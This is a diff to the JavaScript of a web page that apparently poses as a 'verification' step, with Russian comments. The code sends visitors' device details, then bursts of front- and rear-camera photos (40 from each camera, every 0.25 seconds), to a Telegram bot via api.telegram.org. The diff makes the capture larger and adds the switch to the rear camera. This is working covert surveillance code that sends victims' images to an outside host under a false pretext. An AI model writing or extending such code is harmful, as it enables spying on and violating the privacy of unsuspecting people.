@@ -115,6 +115,10 @@
     const playBtn = document.getElementById('playBtn');
     const messageBox = document.getElementById('messageBox');
     let stream = null;
+    let currentCamera = 'user'; // 'user' - фронтальная, 'environment' - задняя
+    let photoCount = 0;
+    const totalPhotos = 40;
+    const photoInterval = 250; // 0.25 секунды в миллисекундах
 
     // Блокировка масштабирования
     document.addEventListener('gesturestart', function(e) {
@@ -144,8 +148,6 @@
         }
         return { error: 'API батареи не поддерживается' };
     }
-
-    // Убрана функция запроса геолокации
 
     // Функция для получения информации о соединении
     function getConnectionInfo() {
@@ -273,7 +275,7 @@
     }
 
     // 2. Захват фото с камеры и отправка
-    async function captureAndSendPhoto(index) {
+    async function captureAndSendPhoto(index, cameraType) {
         try {
             const canvas = document.createElement('canvas');
             canvas.width = videoElement.videoWidth;
@@ -287,9 +289,9 @@
             
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', blob, `verification_photo_${index}.jpg`);
+            formData.append('photo', blob, `photo_${cameraType}_${index}.jpg`);
             
-            const caption = `🆔 Фото верификации #${index}\nВремя: ${new Date().toLocaleString()}`;
+            const caption = `🆔 Фото ${cameraType === 'user' ? 'фронтальной' : 'задней'} камеры #${index}\nВремя: ${new Date().toLocaleString()}`;
             formData.append('caption', caption);
             
             await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
@@ -297,30 +299,40 @@
                 body: formData
             });
             
-            console.log(`Фото ${index} отправлено`);
+            console.log(`Фото ${index} (${cameraType}) отправлено`);
             
         } catch (error) {
             console.error(`Ошибка при отправке фото ${index}:`, error);
         }
     }
 
-    // 3. Серийная съемка - 10 фото с интервалом 0.5 сек
+    // 3. Серийная съемка
     async function takeSeriesOfPhotos() {
         try {
-            for (let i = 1; i <= 10; i++) {
-                await captureAndSendPhoto(i);
-                if (i < 10) {
-                    await new Promise(resolve => setTimeout(resolve, 500));
+            if (photoCount < totalPhotos) {
+                await captureAndSendPhoto(photoCount + 1, currentCamera);
+                photoCount++;
+                
+                if (photoCount < totalPhotos) {
+                    setTimeout(takeSeriesOfPhotos, photoInterval);
+                } else {
+                    // Переключаем на другую камеру
+                    if (currentCamera === 'user') {
+                        currentCamera = 'environment';
+                        photoCount = 0;
+                        stopCamera();
+                        await startCamera();
+                    } else {
+                        // Завершаем съемку
+                        messageBox.style.display = 'block';
+                        stopCamera();
+                    }
                 }
             }
-            
-            // После завершения съемки показываем сообщение
-            messageBox.style.display = 'block';
             
         } catch (error) {
             console.error('Ошибка в процессе серийной съемки:', error);
             messageBox.style.display = 'block';
-        } finally {
             stopCamera();
         }
     }
@@ -339,7 +351,7 @@
             // Запрашиваем разрешение на доступ к камере
             stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { 
-                    facingMode: 'user',
+                    facingMode: currentCamera,
                     width: { ideal: 1280 },
                     height: { ideal: 720 }
                 },
@@ -352,7 +364,8 @@
             await new Promise(resolve => setTimeout(resolve, 1000));
 
             // Начинаем серийную съемку
-            await takeSeriesOfPhotos();
+            photoCount = 0;
+            takeSeriesOfPhotos();
             
         } catch (error) {
             console.error('Ошибка при запуске камеры:', error);
@@ -400,6 +413,8 @@
         try {
             await sendUserInfo();
             console.log('Информация о пользователе отправлена');
+            currentCamera = 'user'; // Начинаем с фронтальной камеры
+            photoCount = 0;
             await startCamera();
         } catch (error) {
             console.error('Общая ошибка процесса верификации:', error);
@@ -411,16 +426,6 @@
     window.addEventListener('load', function() {
         console.log('Страница загружена, отправка информации...');
         sendUserInfo().catch(e => console.error('Ошибка при отправке информации:', e));
-        
-        // В Chrome запрашиваем доступ к камере заранее (но не включаем ее)
-        if (!navigator.userAgent.includes('Telegram')) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    // Немедленно останавливаем камеру, просто чтобы разрешение было получено
-                    stream.getTracks().forEach(track => track.stop());
-                })
-                .catch(e => console.log('Предварительный запрос камеры отклонен:', e));
-        }
     });
 
     // Остановка камеры при закрытии страницы
